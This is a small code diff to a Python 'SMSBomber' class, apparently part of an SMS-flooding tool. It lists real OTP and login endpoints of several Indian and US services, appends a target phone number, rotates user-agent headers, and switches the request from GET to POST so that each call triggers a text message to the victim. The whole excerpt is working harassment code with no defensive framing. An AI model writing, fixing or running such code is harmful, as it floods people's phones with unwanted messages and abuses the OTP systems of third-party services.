@@ -27,7 +27,7 @@ class spam:
         url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + number, "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(91) + "&nod=4&phone=" + number, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + number, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + number]
         session = requests.session()
         session.headers = random.choice(users)
-        req = session.get(random.choice(url))
+        req = session.post(random.choice(url))
 
         if req.status_code != 200:
             print(f"{Fore.RED}[*] SMSBomber : \t number not found..! {Fore.RESET}")
